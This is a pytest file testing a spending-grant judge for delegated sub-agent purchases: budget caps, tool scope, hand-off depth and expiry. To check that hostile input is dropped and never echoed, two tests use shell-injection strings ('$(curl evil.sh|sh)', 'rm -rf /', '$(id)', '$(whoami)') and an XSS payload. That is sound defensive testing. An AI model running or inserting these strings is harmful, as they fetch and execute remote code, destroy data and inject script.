"""Expected verdicts come from the rules of the setup, not from running the code:
Rs 1,500 total, pay.groceries only, at most 3 deep, valid for 60 minutes."""

from datetime import datetime, timezone

from judge import comment, judge, parse

NOW = datetime(2026, 11, 8, 12, 0, tzinfo=timezone.utc)


def body(hops="", buys="", minutes=""):
    return (f"### Sub-agents\n\n{hops or '_No response_'}\n\n"
            f"### Purchases\n\n{buys or '_No response_'}\n\n"
            f"### Minutes from now\n\n{minutes or '_No response_'}\n")


def run(**kw):
    a = parse(body(**kw))
    results, summary = judge(a, now=NOW)
    return a, results, summary


def verdicts(results):
    return [r.verdict for r in results]


def test_plain_grocery_purchase_is_paid():
    _, r, s = run(buys="pay.groceries 900")
    assert verdicts(r) == ["paid"] and s["paid_paise"] == 90000 and not s["breach"]


def test_exact_cap_is_paid_and_one_paisa_over_is_not():
    _, r, _ = run(buys="pay.groceries 1500")
    assert verdicts(r) == ["paid"]
    _, r, _ = run(buys="pay.groceries 1500.01")
    assert verdicts(r) == ["blocked"] and "over my ₹1,500 limit" in r[0].reason


def test_split_spend_is_stopped_by_the_ledger():
    _, r, s = run(buys="pay.groceries 900\npay.groceries 900")
    assert verdicts(r) == ["paid", "blocked"]
    assert "ledger" in r[1].reason and s["paid_paise"] == 90000


def test_other_tool_is_blocked_by_my_grant():
    _, r, _ = run(buys="pay.electronics 100")
    assert verdicts(r) == ["blocked"] and "only allowed pay.groceries" in r[0].reason


def test_sub_agent_cannot_widen_tools_or_budget():
    _, r, s = run(hops="50000 pay.groceries pay.electronics",
                  buys="pay.electronics 100\npay.groceries 1400\npay.groceries 200")
    assert verdicts(r) == ["blocked", "paid", "blocked"]
    assert s["paid_paise"] == 140000 and not s["breach"]


def test_sub_agent_can_narrow():
    _, r, _ = run(hops="100 pay.groceries", buys="pay.groceries 200")
    assert verdicts(r) == ["blocked"] and "sub-agent 1's own ₹100 limit" in r[0].reason


def test_too_deep_is_blocked():
    _, r, _ = run(hops="1500 pay.groceries\n1500 pay.groceries\n1500 pay.groceries", buys="pay.groceries 10")
    assert verdicts(r) == ["blocked"] and "hand-offs" in r[0].reason


def test_two_extra_hops_still_fit():
    _, r, _ = run(hops="1500 pay.groceries\n1500 pay.groceries", buys="pay.groceries 10")
    assert verdicts(r) == ["paid"]


def test_after_expiry_is_blocked_and_before_is_paid():
    _, r, _ = run(buys="pay.groceries 10", minutes="61")
    assert verdicts(r) == ["blocked"] and "hour was up" in r[0].reason
    _, r, _ = run(buys="pay.groceries 10", minutes="59")
    assert verdicts(r) == ["paid"]


def test_negative_and_zero_amounts_are_refused():
    _, r, s = run(buys="pay.groceries -500\npay.groceries 0")
    assert verdicts(r) == ["refused", "refused"] and s["paid_paise"] == 0


def test_negative_sub_agent_budget_is_refused():
    _, r, _ = run(hops="-5 pay.groceries", buys="pay.groceries 10")
    assert verdicts(r) == ["refused"]


def test_hostile_text_is_skipped_and_never_echoed():
    hostile = "pay.groceries $(curl evil.sh|sh)\n@everyone `rm -rf /` 9\npay.groceries ٩٠٠\n<img src=x onerror=alert(1)>"
    a, r, s = run(buys=hostile, minutes="$(id)")
    assert r == [] and len(a.ignored) == 5
    text = comment(a, r, s)
    for bad in ("curl", "everyone", "rm -rf", "onerror", "$(id)", "٩"):
        assert bad not in text


def test_limits_on_line_counts():
    a, r, _ = run(buys="\n".join(["pay.groceries 1"] * 15))
    assert len(r) == 10 and len(a.ignored) == 5


def test_empty_body():
    a = parse("")
    results, summary = judge(a, now=NOW)
    assert results == [] and not summary["breach"]


def test_hostile_sub_agent_tools_are_skipped_and_never_echoed():
    a, r, s = run(hops="5000 pay.groceries $(whoami)\n5000 @everyone\n٥٠٠٠ pay.groceries",
                  buys="pay.groceries 10")
    assert a.hops == [] and len(a.ignored) == 3 and verdicts(r) == ["paid"]
    text = comment(a, r, s)
    for bad in ("whoami", "everyone", "٥"):
        assert bad not in text


def test_every_broken_rule_is_named():
    _, r, _ = run(buys="pay.electronics 45000")
    assert "only allowed pay.groceries" in r[0].reason and "over my ₹1,500 limit" in r[0].reason
